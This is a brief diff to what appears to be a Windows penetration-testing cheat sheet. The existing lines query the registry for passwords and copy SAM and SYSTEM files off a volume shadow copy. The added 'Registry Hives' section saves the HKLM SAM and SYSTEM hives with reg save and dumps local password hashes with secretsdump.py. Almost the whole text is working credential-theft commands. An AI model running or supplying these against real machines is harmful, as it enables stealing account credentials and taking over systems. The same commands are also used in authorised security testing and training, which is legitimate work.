@@ -30,3 +30,10 @@ C:\Users\user> reg query HKCU /f password /t REG_SZ /s
         copy \\path\to\volume\sam  \\somewhere-Else
         copy \\path\to\volume\\system \\soemwhere-Else
         ```
+# Registry Hives:
+```
+reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
+reg save HKLM\system C:\users\Administrator\Desktop\system-reg
+#Extract
+secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
+```
